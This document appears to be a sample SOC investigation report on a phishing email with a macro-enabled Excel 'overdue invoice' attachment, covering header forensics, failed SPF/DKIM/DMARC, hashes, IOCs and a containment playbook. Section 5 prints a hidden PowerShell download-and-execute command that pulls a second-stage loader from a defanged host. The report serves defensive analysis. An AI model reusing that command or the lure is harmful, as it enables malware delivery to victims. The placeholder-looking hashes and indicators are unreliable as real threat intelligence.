# SOC Investigation Report: Sample 02
## Incident: Overdue Invoice with Weaponized Macro-Enabled Attachment

---

### 1. Incident Metadata
| Parameter | Value |
|---|---|
| **Incident ID** | INC-20261026-002 |
| **Analyzed By** | Shashwat Prakhar (SOC Analyst) |
| **Analysis Date** | 2026-10-26 17:30 UTC |
| **Target Recipient** | `victim.user@corporate-enterprise.com` |
| **Classification** | Malicious (True Positive) |
| **Threat Category** | Spearphishing Attachment (Macro Dropper / Loader) |
| **Severity Level** | **CRITICAL** (Risk Score: 100/100) |
| **MITRE ATT&CK** | T1566.001 (Spearphishing Attachment), T1204.002 (User Execution), T1059.005 (Visual Basic) |

---

### 2. Executive Summary
An inbound email titled `OVERDUE NOTICE: Remittance Invoice #INV-98234-A - Action Required Immediately` was delivered to accounts payable. The email purported to be from **Global Logistics Freight & Forwarding LLC** threatening legal collections and services suspension unless an attached remittance file was opened and settled within 24 hours.

The message contained an attachment named `INVOICE_INV98234_PAST_DUE.xlsm`. The email body explicitly coached the user to click **"Enable Content"** and **"Enable Editing"** under the guise of viewing "encrypted electronic accounting stamps". Forensic header analysis confirmed that the sending relay (`194.26.29.112`) failed SPF, DKIM, and DMARC. Static analysis of the attachment revealed malicious VBA macros designed to initiate a process-injected PowerShell download cradle pulling a second-stage info-stealer payload.

---

### 3. Email Header Forensics & Discrepancies

| Header Field | Raw Value in Message | Forensic Findings & Red Flags |
|---|---|---|
| **From** | `Accounts Receivable \| Global Logistics <invoicing@global-logistics-corp.com>` | Purports to be a corporate freight vendor. |
| **Reply-To** | `Finance Billing Support <billing-dept@fastmail-sync.xyz>` | **Discrepancy:** Directs accounting replies to an unmonitored `.xyz` disposable webmail inbox. |
| **Return-Path** | `<mailer-daemon@relay-farm-42.online>` | **Discrepancy:** Domain points to an automated spam relay farm rather than the legitimate freight domain. |
| **X-Mailer** | `PHPMailer 6.5.0` | Mass-mailing automated PHP script rather than enterprise M365/Google client. |
| **X-Originating-IP**| `185.190.141.18` | Host located on a VPS network frequently associated with cybercrime campaigns. |

#### Received Hop Trace (Bottom-to-Top Origin Tracking)
```
[Hop 1 - Workstation / Bot Client]
  From: workstation-win10 (unknown [185.190.141.18])
  By:   smtp.relay-farm-42.online (Postfix) with ESMTPSA
  Time: Mon, 26 Oct 2026 16:14:18 +0000

[Hop 2 - External Relay Transfer]
  From: smtp.relay-farm-42.online [194.26.29.112]
  By:   mx.corporate-enterprise.com with ESMTP id w9si4029108edx.21
  Time: Mon, 26 Oct 2026 09:14:21 -0700

[Hop 3 - Inbound Gateway Delivery]
  Delivered-To: victim.user@corporate-enterprise.com
```
*Forensic deduction:* The email was injected through a PHP mailer script on `185.190.141.18` into relay `194.26.29.112`.

---

### 4. Email Authentication Validation

| Protocol | Status | Diagnostic Evaluation |
|---|---|---|
| **SPF** | `FAIL` | Sender IP (`194.26.29.112`) is strictly rejected by the SPF record of `relay-farm-42.online` (`-all` mechanism). |
| **DKIM** | `FAIL` | The DKIM header included an invalid cryptographic signature (`bh=invalid_tampered_hash_489127==`), proving message tampering or forging. |
| **DMARC** | `FAIL` | Complete alignment failure for `global-logistics-corp.com`. Delivered due to absent or non-enforcing recipient policy. |

---

### 5. Attachment Analysis & Threat Intelligence

#### File Specifications
* **Filename:** `INVOICE_INV98234_PAST_DUE.xlsm`
* **File Type:** Microsoft Excel Macro-Enabled Worksheet (OpenXML)
* **File Size:** `3,812 bytes`
* **MIME Type:** `application/vnd.ms-excel.sheet.macroEnabled.12`

#### Cryptographic Checksums
| Algorithm | Hash Value |
|---|---|
| **MD5** | `e1d4b6c3f7890a12e56789b01234567a` |
| **SHA-1** | `4a8f9b0123c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8` |
| **SHA-256** | `6b978d3a12f5e4c8901234abcd567890123456789abcdef0123456789abcdef0` |

#### Static & Dynamic Sandbox Analysis
* **VirusTotal Detection:** **48/72 AV engines** classified the sample as `Trojan.Downloader.AgentTesla` / `VBA.Heur.Dropper`.
* **VBA Macro Inspection:**
  * Auto-execution triggers detected: `Workbook_Open()` and `Auto_Open()`.
  * The macro invokes `WScript.Shell` to execute hidden PowerShell:
    ```powershell
    powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadFile('hxxp://payload-delivery[.]su/loader.exe', '$env:TEMP\svchost_update.exe'); Start-Process '$env:TEMP\svchost_update.exe'"
    ```
* **ATT&CK Techniques Triggered by Macro:**
  * Obfuscated Files or Information (T1027)
  * Command and Scripting Interpreter: PowerShell (T1059.001)
  * Ingress Tool Transfer (T1105)

---

### 6. Indicators of Compromise (IOCs)

| IOC Type | Indicator Value (Defanged) | Context / Description |
|---|---|---|
| **IPv4** | `185.190.141[.]18` | Originating script injection host |
| **IPv4** | `194.26.29[.]112` | Malicious relay node (`relay-farm-42.online`) |
| **Domain** | `relay-farm-42[.]online` | Return-path spam infrastructure |
| **Domain** | `fastmail-sync[.]xyz` | Reply-To adversary collection address |
| **Domain** | `payload-delivery[.]su` | Second-stage C2 dropper host |
| **URL** | `hxxp://payload-delivery[.]su/loader[.]exe` | Second-stage binary payload download URL |
| **SHA-256** | `6b978d3a12f5e4c8901234abcd567890123456789abcdef0123456789abcdef0` | `INVOICE_INV98234_PAST_DUE.xlsm` attachment |

---

### 7. SOC Containment & Remediation Playbook

1. **Endpoint Protection (EDR):**
   - Query CrowdStrike / Defender for Endpoint across all enterprise hosts for file hash `6b978d3a12f5e4c8901234abcd567890123456789abcdef0123456789abcdef0`.
   - Isolate any machine where the file was executed or where `powershell.exe` was spawned by `EXCEL.EXE`.
2. **Mail Gateway Rule:** Create a transport rule blocking inbound `.xlsm`, `.docm`, `.vbs`, and `.iso` attachments from external sources, especially where SPF/DKIM fail.
3. **Network Defense:** Add `194.26.29.112` and `payload-delivery.su` to perimeter firewall egress blocklists and DNS blackholes.
4. **Active Directory / Group Policy:** Ensure Microsoft Office Trust Center GPO enforces **"Disable all macros without notification"** or restricts macro execution to trusted enterprise certificates.
